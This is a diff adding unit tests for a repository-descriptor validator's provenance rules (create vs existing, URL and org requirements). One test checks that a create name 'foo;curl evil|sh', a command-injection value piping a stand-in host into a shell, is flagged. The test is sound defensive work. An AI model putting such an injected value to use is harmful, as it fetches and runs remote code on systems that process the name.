@@ -461,6 +461,52 @@ test('CA-7/CA-3: deriveProviderBudget devuelve copia y valida Σ ≤ 100% impera
 });
 
 // -----------------------------------------------------------------------------
+// #4800 · provenance de repos (crear nuevo vs usar existente)
+// -----------------------------------------------------------------------------
+
+test('#4800: descriptor legacy sin provenance sigue válido (retro-compat, existing)', () => {
+  const res = d.validateDescriptor(validDescriptor());
+  assert.equal(res.valid, true, JSON.stringify(res.errors));
+});
+
+test('#4800: provenance:existing sin url es rechazado', () => {
+  const res = d.validateDescriptor(validDescriptor({
+    repositories: [{ id: 'main', role: 'primary', provenance: 'existing' }],
+  }));
+  assert.equal(res.valid, false);
+});
+
+test('#4800: provenance:create sin url valida (url la completa el kernel)', () => {
+  const res = d.validateDescriptor(validDescriptor({
+    repositories: [{ id: 'main', role: 'primary', provenance: 'create', create: { name: 'store', org: 'intrale', visibility: 'private' } }],
+  }));
+  assert.equal(res.valid, true, JSON.stringify(res.errors));
+});
+
+test('#4800: provenance:create CON url es rechazado (el contrato prohíbe url)', () => {
+  const res = d.validateDescriptor(validDescriptor({
+    repositories: [{ id: 'main', url: 'https://github.com/intrale/store', role: 'primary', provenance: 'create', create: { name: 'store', org: 'intrale' } }],
+  }));
+  assert.equal(res.valid, false);
+});
+
+test('#4800: provenance:create sin create.org es rechazado por la cross-validation lib', () => {
+  const res = d.validateDescriptor(validDescriptor({
+    repositories: [{ id: 'main', role: 'primary', provenance: 'create', create: { name: 'store' } }],
+  }));
+  assert.equal(res.valid, false);
+  assert.equal(res.stage, 'repositories');
+  assert.ok(res.errors.some((e) => /create\.org/.test(e.path)));
+});
+
+test('#4800: collectRepositoryProvenanceHits — create con name inválido (inyección) es rechazado', () => {
+  const hits = d.collectRepositoryProvenanceHits({
+    repositories: [{ id: 'main', provenance: 'create', create: { name: 'foo;curl evil|sh', org: 'intrale' } }],
+  });
+  assert.ok(hits.some((h) => /create\.name/.test(h.path)));
+});
+
+// -----------------------------------------------------------------------------
 // #4805 — transitionStatus: writer atómico dueño del estado (onboarding→active).
 //   CA-1 : onboarding→active persiste status:"active" atómico + checksum.
 //   CA-2 : active→active y transición arbitraria rechazadas SIN mutar.
